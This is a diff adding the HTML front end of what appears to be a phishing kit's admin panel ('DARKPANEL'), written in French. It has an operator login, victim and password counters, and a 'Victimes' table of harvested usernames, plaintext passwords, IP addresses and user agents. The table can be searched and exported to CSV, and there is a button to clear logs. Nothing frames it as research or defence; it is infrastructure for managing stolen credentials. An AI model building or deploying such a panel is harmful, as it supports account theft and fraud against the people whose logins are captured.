@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel | Secure Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+</head>
+<body class="admin-body">
+    <div class="admin-particles" id="admin-particles"></div>
+    
+    <!-- Login Screen -->
+    <div id="admin-login" class="admin-login-container">
+        <div class="login-glass">
+            <div class="login-header">
+                <div class="admin-logo">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h2>Secure Admin</h2>
+                <p>Authentification requise</p>
+            </div>
+            
+            <div class="login-form">
+                <div class="input-group">
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" id="admin-user" placeholder="Identifiant" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" id="admin-pass" placeholder="Mot de passe">
+                </div>
+                <div class="security-check">
+                    <div class="check-item" id="check-1">
+                        <i class="fas fa-fingerprint"></i>
+                        <span>Vérification biométrique...</span>
+                    </div>
+                    <div class="check-item" id="check-2">
+                        <i class="fas fa-shield-virus"></i>
+                        <span>Scan de sécurité...</span>
+                    </div>
+                </div>
+                <button class="btn btn-primary admin-login-btn" onclick="adminLogin()">
+                    <i class="fas fa-unlock"></i> ACCÉDER AU PANEL
+                </button>
+                <div class="login-error" id="login-error">
+                    <i class="fas fa-exclamation-circle"></i> Accès refusé
+                </div>
+            </div>
+            
+            <div class="login-footer">
+                <span class="ip-display">IP: <span id="admin-ip">---.---.---.---</span></span>
+                <span class="session-timer">Session: <span id="session-time">--:--</span></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="admin-dashboard" class="admin-dashboard" style="display: none;">
+        <!-- Sidebar -->
+        <nav class="admin-sidebar">
+            <div class="sidebar-header">
+                <div class="admin-logo-small">
+                    <i class="fas fa-dragon"></i>
+                </div>
+                <span class="sidebar-title">DARK<span>PANEL</span></span>
+            </div>
+            
+            <ul class="sidebar-menu">
+                <li class="active" onclick="showSection('overview')">
+                    <i class="fas fa-chart-line"></i>
+                    <span>Vue d'ensemble</span>
+                </li>
+                <li onclick="showSection('victims')">
+                    <i class="fas fa-users"></i>
+                    <span>Victimes</span>
+                    <span class="badge" id="victim-count">0</span>
+                </li>
+                <li onclick="showSection('logs')">
+                    <i class="fas fa-terminal"></i>
+                    <span>Logs système</span>
+                </li>
+                <li onclick="showSection('settings')">
+                    <i class="fas fa-cog"></i>
+                    <span>Paramètres</span>
+                </li>
+            </ul>
+            
+            <div class="sidebar-footer">
+                <button class="btn btn-danger" onclick="adminLogout()">
+                    <i class="fas fa-power-off"></i> Déconnexion
+                </button>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="admin-main">
+            <!-- Top Bar -->
+            <header class="admin-header">
+                <div class="header-search">
+                    <i class="fas fa-search"></i>
+                    <input type="text" placeholder="Rechercher une victime..." id="global-search">
+                </div>
+                <div class="header-actions">
+                    <div class="notification-bell" onclick="toggleNotifications()">
+                        <i class="fas fa-bell"></i>
+                        <span class="notif-badge" id="notif-count">0</span>
+                    </div>
+                    <div class="admin-profile">
+                        <div class="profile-avatar">
+                            <i class="fas fa-user-secret"></i>
+                        </div>
+                        <div class="profile-info">
+                            <span class="profile-name">Super Admin</span>
+                            <span class="profile-status">En ligne</span>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Overview Section -->
+            <section id="section-overview" class="admin-section active">
+                <div class="section-header">
+                    <h1><i class="fas fa-home"></i> Tableau de bord</h1>
+                    <div class="live-indicator">
+                        <span class="pulse"></span>
+                        LIVE
+                    </div>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card gradient-blue">
+                        <div class="stat-icon">
+                            <i class="fas fa-users"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3 id="total-victims">0</h3>
+                            <p>Total Victimes</p>
+                        </div>
+                        <div class="stat-chart sparkline" id="chart-1"></div>
+                    </div>
+                    
+                    <div class="stat-card gradient-green">
+                        <div class="stat-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3 id="today-victims">0</h3>
+                            <p>Aujourd'hui</p>
+                        </div>
+                        <div class="stat-trend up">
+                            <i class="fas fa-arrow-up"></i> +<span id="trend-percent">0</span>%
+                        </div>
+                    </div>
+                    
+                    <div class="stat-card gradient-purple">
+                        <div class="stat-icon">
+                            <i class="fas fa-key"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3 id="passwords-count">0</h3>
+                            <p>Mots de passe</p>
+                        </div>
+                    </div>
+                    
+                    <div class="stat-card gradient-orange">
+                        <div class="stat-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3 id="last-activity">--:--</h3>
+                            <p>Dernière activité</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="dashboard-grid">
+                    <div class="dashboard-card recent-victims">
+                        <div class="card-header">
+                            <h3><i class="fas fa-user-clock"></i> Dernières victimes</h3>
+                            <button class="btn btn-sm" onclick="exportData()">
+                                <i class="fas fa-download"></i> Export
+                            </button>
+                        </div>
+                        <div class="victims-list" id="recent-victims-list">
+                            <!-- Dynamic content -->
+                        </div>
+                    </div>
+                    
+                    <div class="dashboard-card activity-chart">
+                        <div class="card-header">
+                            <h3><i class="fas fa-chart-area"></i> Activité 24h</h3>
+                        </div>
+                        <canvas id="activityChart"></canvas>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Victims Section -->
+            <section id="section-victims" class="admin-section">
+                <div class="section-header">
+                    <h1><i class="fas fa-users"></i> Gestion des victimes</h1>
+                    <div class="header-actions-bar">
+                        <div class="search-box">
+                            <i class="fas fa-search"></i>
+                            <input type="text" id="victim-search" placeholder="Rechercher..." onkeyup="filterVictims()">
+                        </div>
+                        <button class="btn btn-primary" onclick="refreshData()">
+                            <i class="fas fa-sync-alt"></i> Actualiser
+                        </button>
+                        <button class="btn btn-success" onclick="exportToCSV()">
+                            <i class="fas fa-file-csv"></i> Export CSV
+                        </button>
+                    </div>
+                </div>
+
+                <div class="data-table-container">
+                    <table class="data-table" id="victims-table">
+                        <thead>
+                            <tr>
+                                <th><input type="checkbox" id="select-all"></th>
+                                <th>Avatar</th>
+                                <th>Username</th>
+                                <th>Password</th>
+                                <th>IP Address</th>
+                                <th>Date/Heure</th>
+                                <th>User Agent</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="victims-tbody">
+                            <!-- Dynamic content -->
+                        </tbody>
+                    </table>
+                </div>
+                
+                <div class="table-pagination">
+                    <button class="btn btn-sm" onclick="changePage(-1)"><i class="fas fa-chevron-left"></i></button>
+                    <span id="page-info">Page 1 sur 1</span>
+                    <button class="btn btn-sm" onclick="changePage(1)"><i class="fas fa-chevron-right"></i></button>
+                </div>
+            </section>
+
+            <!-- Logs Section -->
+            <section id="section-logs" class="admin-section">
+                <div class="section-header">
+                    <h1><i class="fas fa-terminal"></i> Logs système</h1>
+                    <button class="btn btn-danger" onclick="clearLogs()">
+                        <i class="fas fa-trash"></i> Vider les logs
+                    </button>
+                </div>
+                <div class="logs-container" id="system-logs">
+                    <!-- Dynamic logs -->
+                </div>
+            </section>
+
+            <!-- Settings Section -->
+            <section id="section-settings" class="admin-section">
+                <div class="section-header">
+                    <h1><i class="fas fa-cog"></i> Paramètres</h1>
+                </div>
+                <div class="settings-grid">
+                    <div class="settings-card">
+                        <h3>Sécurité</h3>
+                        <div class="setting-item">
+                            <label>2FA Activé</label>
+                            <div class="toggle-switch active">
+                                <div class="toggle-slider"></div>
+                            </div>
+                        </div>
+                        <div class="setting-item">
+                            <label>Session Timeout</label>
+                            <select class="form-select">
+                                <option>15 minutes</option>
+                                <option selected>30 minutes</option>
+                                <option>1 heure</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Detail Modal -->
+    <div id="victim-modal" class="modal">
+        <div class="modal-content glass-modal">
+            <div class="modal-header">
+                <h2><i class="fas fa-user-circle"></i> Détails de la victime</h2>
+                <button class="close-btn" onclick="closeModal()"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body" id="modal-content">
+                <!-- Dynamic content -->
+            </div>
+        </div>
+    </div>
+
+    <script src="admin.js"></script>
+</body>
+</html>
